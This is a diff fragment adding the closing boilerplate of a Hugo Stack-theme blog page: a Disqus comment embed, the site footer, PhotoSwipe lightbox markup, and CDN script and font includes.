+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
